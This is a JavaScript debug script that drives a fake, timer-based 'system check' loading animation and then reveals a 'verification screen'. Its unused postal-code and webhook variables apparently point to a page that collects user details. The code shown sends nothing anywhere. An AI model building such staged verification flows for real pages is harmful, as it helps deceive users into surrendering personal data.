// Debug version to test basic functionality
console.log('🚀 Debug script loaded');

// Basic variables
let loadingProgress = 0;
let userPostalCode = '';
let initialWebhookSent = false;
let sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

// Loading steps
const loadingSteps = [
    { text: 'Initializing system...', duration: 1500 },
    { text: 'Checking system requirements...', duration: 2000 },
    { text: 'Verifying device compatibility...', duration: 2000 },
    { text: 'Preparing authentication...', duration: 1500 },
    { text: 'Setting up verification...', duration: 1000 }
];

// Update progress bar
function updateProgressBar(percentage) {
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    console.log(`📊 Updating progress bar to ${percentage}%`);
    
    if (progressFill) {
        progressFill.style.width = percentage + '%';
    } else {
        console.error('❌ Progress fill element not found');
    }
    
    if (progressText) {
        progressText.textContent = loadingSteps[Math.floor((percentage / 100) * loadingSteps.length)]?.text || 'Loading...';
    } else {
        console.error('❌ Progress text element not found');
    }
}

// Update status item
function updateStatusItem(statusId, icon, text, isActive, isCompleted) {
    const statusItem = document.getElementById(statusId);
    if (!statusItem) {
        console.log(`❌ Status item ${statusId} not found`);
        return;
    }
    
    const statusIcon = statusItem.querySelector('.status-icon');
    const statusText = statusItem.querySelector('.status-text');
    
    statusIcon.textContent = icon;
    statusText.textContent = text;
    
    statusItem.classList.remove('active', 'completed');
    if (isActive) {
        statusItem.classList.add('active');
    } else if (isCompleted) {
        statusItem.classList.add('completed');
    }
}

// Start loading sequence
async function startLoadingSequence() {
    console.log('🚀 Starting loading sequence...');
    
    const progressFill = document.getElementById('progress-fill');
    const progressText = document.getElementById('progress-text');
    
    if (!progressFill || !progressText) {
        console.error('❌ Progress elements not found');
        console.log('  - progressFill:', progressFill ? '✅ Found' : '❌ Missing');
        console.log('  - progressText:', progressText ? '✅ Found' : '❌ Missing');
        return;
    }
    
    console.log('✅ Progress elements found, starting sequence...');
    
    for (let i = 0; i < loadingSteps.length; i++) {
        const step = loadingSteps[i];
        progressText.textContent = step.text;
        console.log(`📊 Step ${i + 1}: ${step.text}`);
        
        // Update status items
        if (i === 0) {
            updateStatusItem('status-1', '⏳', step.text, true);
        } else if (i === 1) {
            updateStatusItem('status-1', '✅', 'Checking system requirements', false, true);
            updateStatusItem('status-2', '⏳', step.text, true);
        } else if (i === 2) {
            updateStatusItem('status-2', '✅', 'Verifying device compatibility', false, true);
            updateStatusItem('status-3', '⏳', step.text, true);
        } else if (i === 3) {
            updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
        }
        
        // Update progress bar
        const targetProgress = ((i + 1) / loadingSteps.length) * 100;
        const progressIncrement = targetProgress - loadingProgress;
        const steps = 20;
        const incrementAmount = progressIncrement / steps;
        
        for (let j = 0; j < steps; j++) {
            loadingProgress += incrementAmount;
            updateProgressBar(loadingProgress);
            await new Promise(resolve => setTimeout(resolve, step.duration / steps));
        }
        
        loadingProgress = targetProgress;
        updateProgressBar(loadingProgress);
    }
    
    // Complete all status items
    updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
    
    // Wait a moment before transitioning
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Hide loading screen and show verification screen
    console.log('🔄 Transitioning from loading screen to verification screen...');
    const loadingScreen = document.getElementById('loading-screen');
    const verificationScreen = document.getElementById('verification-screen');
    
    if (loadingScreen && verificationScreen) {
        loadingScreen.style.display = 'none';
        verificationScreen.style.display = 'flex';
        console.log('✅ Successfully transitioned to verification screen');
    } else {
        console.error('❌ Failed to find loading screen or verification screen elements');
        console.log('  - loadingScreen:', loadingScreen ? '✅ Found' : '❌ Missing');
        console.log('  - verificationScreen:', verificationScreen ? '✅ Found' : '❌ Missing');
    }
    
    console.log('✅ Loading sequence completed!');
}

// Initialize when page loads
window.addEventListener('load', function() {
    console.log('🚀 Page loaded, starting loading sequence...');
    setTimeout(() => {
        startLoadingSequence();
    }, 500);
});

console.log('✅ Debug script initialized');
